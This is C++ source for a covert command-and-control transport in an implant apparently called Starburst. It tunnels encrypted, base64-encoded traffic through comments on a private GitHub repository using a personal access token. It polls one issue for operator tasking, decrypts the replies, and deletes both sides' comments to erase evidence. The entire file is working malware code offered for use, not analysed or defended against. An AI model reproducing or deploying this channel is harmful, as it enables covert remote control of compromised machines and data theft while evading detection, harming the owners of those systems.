#include <common.h>
#include <transport_github.h>
#include <base64.h>
#include <crypto.h>
#include <strings.h>

#if defined( GITHUB_TRANSPORT )

using namespace stardust;
using namespace starburst;

// GitHub API uses WinINet (InternetOpenA/HttpOpenRequestA)
// Communication via issue comments on a private repo:
//   - Agent posts to client_issue
//   - Agent polls server_issue for responses
//   - Auth via Personal Access Token in Authorization header

#define GITHUB_API_HOST "api.github.com"
#define GITHUB_API_PORT 443

static auto declfn github_build_path(
    instance& inst,
    char*     out,
    uint32_t  issue_num,
    bool      comments_only
) -> void {
    // /repos/{owner}/{repo}/issues/{num}/comments
    str_copy( out, symbol<char*>( const_cast<char*>( "/repos/" ) ) );
    str_concat( out, inst.transport.github_owner );
    str_concat( out, symbol<char*>( const_cast<char*>( "/" ) ) );
    str_concat( out, inst.transport.github_repo );
    str_concat( out, symbol<char*>( const_cast<char*>( "/issues/" ) ) );

    char num_buf[16] = { 0 };
    int_to_str( issue_num, num_buf, 10 );
    str_concat( out, num_buf );

    if ( comments_only ) {
        str_concat( out, symbol<char*>( const_cast<char*>( "/comments" ) ) );
    }
}

static auto declfn github_build_auth_header(
    instance& inst,
    char*     out
) -> void {
    str_copy( out, symbol<char*>( const_cast<char*>( "Authorization: token " ) ) );
    str_concat( out, inst.transport.github_pat );
    str_concat( out, symbol<char*>( const_cast<char*>( "\r\nAccept: application/vnd.github.v3+json\r\nContent-Type: application/json\r\nUser-Agent: Starburst/1.0\r\n" ) ) );
}

// extract "body" field value from GitHub JSON response
// minimal scanner - no full JSON parser needed in PIC
static auto declfn github_extract_body(
    instance& inst,
    char*     json,
    uint32_t  json_len,
    char*     out,
    uint32_t  out_max
) -> uint32_t {
    // find "body":" pattern
    auto needle = symbol<char*>( const_cast<char*>( "\"body\":\"" ) );
    uint32_t needle_len = str_len( needle );
    uint32_t out_pos = 0;

    for ( uint32_t i = 0; i + needle_len < json_len; i++ ) {
        bool match = true;
        for ( uint32_t j = 0; j < needle_len; j++ ) {
            if ( json[i + j] != needle[j] ) {
                match = false;
                break;
            }
        }

        if ( match ) {
            uint32_t start = i + needle_len;
            for ( uint32_t k = start; k < json_len && out_pos < out_max - 1; k++ ) {
                if ( json[k] == '\\' && k + 1 < json_len ) {
                    if ( json[k + 1] == '"' ) {
                        out[out_pos++] = '"';
                        k++;
                        continue;
                    }
                    if ( json[k + 1] == 'n' ) {
                        out[out_pos++] = '\n';
                        k++;
                        continue;
                    }
                    if ( json[k + 1] == '\\' ) {
                        out[out_pos++] = '\\';
                        k++;
                        continue;
                    }
                }
                if ( json[k] == '"' ) break;
                out[out_pos++] = json[k];
            }
            break;
        }
    }

    out[out_pos] = '\0';
    return out_pos;
}

// extract comment ID from JSON: "id":12345
static auto declfn github_extract_comment_id(
    char*    json,
    uint32_t json_len
) -> uint32_t {
    // find first "id": after start of object
    auto needle = symbol<char*>( const_cast<char*>( "\"id\":" ) );
    uint32_t needle_len = str_len( needle );

    for ( uint32_t i = 0; i + needle_len < json_len; i++ ) {
        bool match = true;
        for ( uint32_t j = 0; j < needle_len; j++ ) {
            if ( json[i + j] != needle[j] ) {
                match = false;
                break;
            }
        }

        if ( match ) {
            uint32_t start = i + needle_len;
            // skip whitespace
            while ( start < json_len && json[start] == ' ' ) start++;

            uint32_t id = 0;
            for ( uint32_t k = start; k < json_len; k++ ) {
                if ( json[k] >= '0' && json[k] <= '9' ) {
                    id = id * 10 + (json[k] - '0');
                } else {
                    break;
                }
            }
            return id;
        }
    }
    return 0;
}

auto declfn starburst::github_init(
    _Inout_ instance& inst
) -> bool {
    // WinINet init
    auto h_inet = inst.wininet.InternetOpenA(
        symbol<const char*>( "Starburst/1.0" ),
        INTERNET_OPEN_TYPE_PRECONFIG,
        nullptr,
        nullptr,
        0
    );

    if ( !h_inet ) {
        DBG_PRINT( inst, "InternetOpenA failed: %d\n", inst.kernel32.GetLastError() );
        return false;
    }

    // store session handle in transport struct via a cast
    // we'll use the wininet handle field
    inst.wininet.handle = reinterpret_cast<uintptr_t>( h_inet );

    DBG_PRINT( inst, "GitHub transport initialized -> %s/%s issues %d/%d\n",
        inst.transport.github_owner, inst.transport.github_repo,
        inst.transport.server_issue, inst.transport.client_issue );

    return true;
}

auto declfn starburst::github_send(
    _Inout_ instance& inst,
    _In_    uint8_t*  data,
    _In_    uint32_t  len,
    _Out_   uint8_t** response,
    _Out_   uint32_t* resp_len
) -> bool {
    *response = nullptr;
    *resp_len = 0;

    // encrypt
    uint8_t* encrypted = nullptr;
    uint32_t enc_len   = 0;
    if ( !crypto_encrypt( inst, inst.agent.aes_key, data, len, &encrypted, &enc_len ) ) {
        return false;
    }

    // prepend UUID + encrypted
    auto uuid = inst.agent.checked_in ? inst.agent.uuid : inst.agent.payload_uuid;
    uint32_t uuid_len = str_len( uuid );
    uint32_t raw_len  = uuid_len + enc_len;
    auto raw = static_cast<uint8_t*>( inst.heap_alloc( raw_len ) );
    if ( !raw ) {
        inst.heap_free( encrypted );
        return false;
    }
    memory::copy( raw, uuid, uuid_len );
    memory::copy( raw + uuid_len, encrypted, enc_len );
    inst.heap_free( encrypted );

    // base64 encode
    uint32_t b64_len = 0;
    auto b64 = base64_encode( inst, raw, raw_len, &b64_len );
    inst.heap_free( raw );
    if ( !b64 ) return false;

    // build JSON body: {"body":"<base64>"}
    uint32_t json_len = b64_len + 32;
    auto json_body = static_cast<char*>( inst.heap_alloc( json_len ) );
    if ( !json_body ) {
        inst.heap_free( b64 );
        return false;
    }

    str_copy( json_body, symbol<char*>( const_cast<char*>( "{\"body\":\"" ) ) );
    // append b64 data manually (it's uint8_t*, need char copy)
    uint32_t pos = str_len( json_body );
    memory::copy( json_body + pos, b64, b64_len );
    pos += b64_len;
    str_copy( json_body + pos, symbol<char*>( const_cast<char*>( "\"}" ) ) );
    pos += 2;

    inst.heap_free( b64 );

    // POST comment to client_issue
    char path[512] = { 0 };
    github_build_path( inst, path, inst.transport.client_issue, true );

    char auth_header[512] = { 0 };
    github_build_auth_header( inst, auth_header );

    auto h_connect = inst.wininet.InternetConnectA(
        reinterpret_cast<HINTERNET>( inst.wininet.handle ),
        symbol<const char*>( GITHUB_API_HOST ),
        GITHUB_API_PORT,
        nullptr,
        nullptr,
        INTERNET_SERVICE_HTTP,
        0,
        0
    );

    if ( !h_connect ) {
        inst.heap_free( json_body );
        return false;
    }

    DWORD flags = INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD;
    auto h_request = inst.wininet.HttpOpenRequestA(
        h_connect,
        symbol<const char*>( "POST" ),
        path,
        nullptr,
        nullptr,
        nullptr,
        flags,
        0
    );

    if ( !h_request ) {
        inst.wininet.InternetCloseHandle( h_connect );
        inst.heap_free( json_body );
        return false;
    }

    inst.wininet.HttpAddRequestHeadersA( h_request, auth_header, str_len( auth_header ), HTTP_ADDREQ_FLAG_ADD );

    BOOL sent = inst.wininet.HttpSendRequestA(
        h_request,
        nullptr, 0,
        json_body, pos
    );

    inst.heap_free( json_body );

    if ( !sent ) {
        inst.wininet.InternetCloseHandle( h_request );
        inst.wininet.InternetCloseHandle( h_connect );
        return false;
    }

    // read POST response to get our comment ID (for later cleanup)
    uint8_t* post_resp_buf  = nullptr;
    uint32_t post_resp_size = 0;
    uint32_t post_resp_cap  = 0;
    DWORD read = 0;
    uint8_t tmp[4096];

    while ( true ) {
        read = 0;
        if ( !inst.wininet.InternetReadFile( h_request, tmp, sizeof(tmp), &read ) || read == 0 ) break;

        if ( post_resp_size + read > post_resp_cap ) {
            uint32_t new_cap = post_resp_cap == 0 ? 4096 : post_resp_cap;
            while ( new_cap < post_resp_size + read ) new_cap *= 2;
            post_resp_buf = static_cast<uint8_t*>( inst.heap_realloc( post_resp_buf, new_cap ) );
            post_resp_cap = new_cap;
        }
        memory::copy( post_resp_buf + post_resp_size, tmp, read );
        post_resp_size += read;
    }

    uint32_t our_comment_id = 0;
    if ( post_resp_buf && post_resp_size > 0 ) {
        our_comment_id = github_extract_comment_id(
            reinterpret_cast<char*>( post_resp_buf ), post_resp_size );
        inst.heap_free( post_resp_buf );
    }

    inst.wininet.InternetCloseHandle( h_request );
    inst.wininet.InternetCloseHandle( h_connect );

    // poll server_issue for response comment
    // retry with backoff: 500ms initial, up to 60 attempts (~2 min total)
    uint8_t* server_resp_buf  = nullptr;
    uint32_t server_resp_size = 0;

    for ( uint32_t attempt = 0; attempt < 60; attempt++ ) {
        // sleep between polls
        LARGE_INTEGER delay;
        uint32_t sleep_ms = 500 + (attempt * 100);
        if ( sleep_ms > 3000 ) sleep_ms = 3000;
        delay.QuadPart = -static_cast<LONGLONG>( sleep_ms ) * 10000LL;
        inst.ntdll.NtDelayExecution( FALSE, &delay );

        char server_path[512] = { 0 };
        github_build_path( inst, server_path, inst.transport.server_issue, true );

        auto h_conn2 = inst.wininet.InternetConnectA(
            reinterpret_cast<HINTERNET>( inst.wininet.handle ),
            symbol<const char*>( GITHUB_API_HOST ),
            GITHUB_API_PORT,
            nullptr, nullptr,
            INTERNET_SERVICE_HTTP, 0, 0
        );
        if ( !h_conn2 ) continue;

        auto h_req2 = inst.wininet.HttpOpenRequestA(
            h_conn2,
            symbol<const char*>( "GET" ),
            server_path,
            nullptr, nullptr, nullptr,
            INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD,
            0
        );
        if ( !h_req2 ) {
            inst.wininet.InternetCloseHandle( h_conn2 );
            continue;
        }

        inst.wininet.HttpAddRequestHeadersA( h_req2, auth_header, str_len( auth_header ), HTTP_ADDREQ_FLAG_ADD );

        if ( !inst.wininet.HttpSendRequestA( h_req2, nullptr, 0, nullptr, 0 ) ) {
            inst.wininet.InternetCloseHandle( h_req2 );
            inst.wininet.InternetCloseHandle( h_conn2 );
            continue;
        }

        // read GET response
        uint8_t* get_buf  = nullptr;
        uint32_t get_size = 0;
        uint32_t get_cap  = 0;

        while ( true ) {
            read = 0;
            if ( !inst.wininet.InternetReadFile( h_req2, tmp, sizeof(tmp), &read ) || read == 0 ) break;
            if ( get_size + read > get_cap ) {
                uint32_t new_cap = get_cap == 0 ? 4096 : get_cap;
                while ( new_cap < get_size + read ) new_cap *= 2;
                get_buf = static_cast<uint8_t*>( inst.heap_realloc( get_buf, new_cap ) );
                get_cap = new_cap;
            }
            memory::copy( get_buf + get_size, tmp, read );
            get_size += read;
        }

        inst.wininet.InternetCloseHandle( h_req2 );
        inst.wininet.InternetCloseHandle( h_conn2 );

        if ( get_buf && get_size > 0 ) {
            // extract body from the LAST comment (most recent)
            // find last occurrence of "body":"
            char body_content[65536] = { 0 };
            uint32_t body_len = 0;

            // scan backwards for last "body" field
            auto json_str = reinterpret_cast<char*>( get_buf );
            auto needle = symbol<char*>( const_cast<char*>( "\"body\":\"" ) );
            uint32_t needle_len = str_len( needle );
            int32_t last_pos = -1;

            for ( uint32_t i = 0; i + needle_len < get_size; i++ ) {
                bool match = true;
                for ( uint32_t j = 0; j < needle_len; j++ ) {
                    if ( json_str[i + j] != needle[j] ) { match = false; break; }
                }
                if ( match ) last_pos = i;
            }

            if ( last_pos >= 0 ) {
                body_len = github_extract_body(
                    inst,
                    json_str + last_pos,
                    get_size - last_pos,
                    body_content,
                    sizeof( body_content )
                );
            }

            // extract comment ID of the last comment for deletion
            uint32_t server_comment_id = 0;
            if ( last_pos >= 0 ) {
                // find "id": before the last "body" - scan backwards from last_pos
                auto id_needle = symbol<char*>( const_cast<char*>( "\"id\":" ) );
                uint32_t id_needle_len = str_len( id_needle );
                for ( int32_t i = last_pos; i >= 0; i-- ) {
                    bool match = true;
                    for ( uint32_t j = 0; j < id_needle_len; j++ ) {
                        if ( json_str[i + j] != id_needle[j] ) { match = false; break; }
                    }
                    if ( match ) {
                        server_comment_id = github_extract_comment_id( json_str + i, get_size - i );
                        break;
                    }
                }
            }

            inst.heap_free( get_buf );

            if ( body_len > 0 ) {
                // base64 decode body
                uint32_t decoded_len = 0;
                auto decoded = base64_decode(
                    inst,
                    reinterpret_cast<uint8_t*>( body_content ),
                    body_len,
                    &decoded_len
                );

                if ( decoded && decoded_len > 36 ) {
                    // skip UUID prefix
                    uint8_t* cipher_data = decoded + 36;
                    uint32_t cipher_len  = decoded_len - 36;

                    uint8_t* plain     = nullptr;
                    uint32_t plain_len = 0;

                    if ( crypto_decrypt( inst, inst.agent.aes_key, cipher_data, cipher_len, &plain, &plain_len ) ) {
                        server_resp_buf  = plain;
                        server_resp_size = plain_len;
                    }

                    inst.heap_free( decoded );
                }

                // delete server comment (cleanup)
                if ( server_comment_id > 0 ) {
                    char del_path[512] = { 0 };
                    str_copy( del_path, symbol<char*>( const_cast<char*>( "/repos/" ) ) );
                    str_concat( del_path, inst.transport.github_owner );
                    str_concat( del_path, symbol<char*>( const_cast<char*>( "/" ) ) );
                    str_concat( del_path, inst.transport.github_repo );
                    str_concat( del_path, symbol<char*>( const_cast<char*>( "/issues/comments/" ) ) );
                    char id_str[16] = { 0 };
                    int_to_str( server_comment_id, id_str, 10 );
                    str_concat( del_path, id_str );

                    auto h_conn3 = inst.wininet.InternetConnectA(
                        reinterpret_cast<HINTERNET>( inst.wininet.handle ),
                        symbol<const char*>( GITHUB_API_HOST ),
                        GITHUB_API_PORT,
                        nullptr, nullptr, INTERNET_SERVICE_HTTP, 0, 0
                    );
                    if ( h_conn3 ) {
                        auto h_req3 = inst.wininet.HttpOpenRequestA(
                            h_conn3,
                            symbol<const char*>( "DELETE" ),
                            del_path, nullptr, nullptr, nullptr,
                            INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE,
                            0
                        );
                        if ( h_req3 ) {
                            inst.wininet.HttpAddRequestHeadersA( h_req3, auth_header, str_len( auth_header ), HTTP_ADDREQ_FLAG_ADD );
                            inst.wininet.HttpSendRequestA( h_req3, nullptr, 0, nullptr, 0 );
                            inst.wininet.InternetCloseHandle( h_req3 );
                        }
                        inst.wininet.InternetCloseHandle( h_conn3 );
                    }
                }

                // also delete our comment on client_issue
                if ( our_comment_id > 0 ) {
                    char del_path2[512] = { 0 };
                    str_copy( del_path2, symbol<char*>( const_cast<char*>( "/repos/" ) ) );
                    str_concat( del_path2, inst.transport.github_owner );
                    str_concat( del_path2, symbol<char*>( const_cast<char*>( "/" ) ) );
                    str_concat( del_path2, inst.transport.github_repo );
                    str_concat( del_path2, symbol<char*>( const_cast<char*>( "/issues/comments/" ) ) );
                    char id_str2[16] = { 0 };
                    int_to_str( our_comment_id, id_str2, 10 );
                    str_concat( del_path2, id_str2 );

                    auto h_conn4 = inst.wininet.InternetConnectA(
                        reinterpret_cast<HINTERNET>( inst.wininet.handle ),
                        symbol<const char*>( GITHUB_API_HOST ),
                        GITHUB_API_PORT,
                        nullptr, nullptr, INTERNET_SERVICE_HTTP, 0, 0
                    );
                    if ( h_conn4 ) {
                        auto h_req4 = inst.wininet.HttpOpenRequestA(
                            h_conn4,
                            symbol<const char*>( "DELETE" ),
                            del_path2, nullptr, nullptr, nullptr,
                            INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE,
                            0
                        );
                        if ( h_req4 ) {
                            inst.wininet.HttpAddRequestHeadersA( h_req4, auth_header, str_len( auth_header ), HTTP_ADDREQ_FLAG_ADD );
                            inst.wininet.HttpSendRequestA( h_req4, nullptr, 0, nullptr, 0 );
                            inst.wininet.InternetCloseHandle( h_req4 );
                        }
                        inst.wininet.InternetCloseHandle( h_conn4 );
                    }
                }

                if ( server_resp_buf ) {
                    *response = server_resp_buf;
                    *resp_len = server_resp_size;
                    return true;
                }
            }
        } else {
            if ( get_buf ) inst.heap_free( get_buf );
        }
    }

    return false;
}

auto declfn starburst::github_destroy(
    _Inout_ instance& inst
) -> void {
    if ( inst.wininet.handle ) {
        inst.wininet.InternetCloseHandle( reinterpret_cast<HINTERNET>( inst.wininet.handle ) );
        inst.wininet.handle = 0;
    }
}

#endif
